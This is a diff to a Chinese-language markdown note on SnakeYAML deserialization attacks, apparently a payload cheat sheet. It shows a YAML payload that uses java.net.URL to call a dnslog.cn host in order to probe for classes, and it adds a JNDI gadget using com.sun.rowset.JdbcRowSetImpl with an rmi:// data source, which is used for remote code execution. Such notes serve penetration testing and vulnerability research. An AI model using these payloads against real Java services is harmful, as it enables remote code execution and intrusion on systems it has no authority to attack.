@@ -23,3 +23,9 @@ String data2 = "!!javax.script.ScriptEngineManager [\n" +
 ```java
  String poc = "[!!判断的类全类名 []: 0, !!java.net.URL [null, \"http://ixvoxg.dnslog.cn\"]: 1]";
 ```
+
+## 其他链 一般是jndi
+
+```
+!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://xxxx", autoCommit: true}
+```
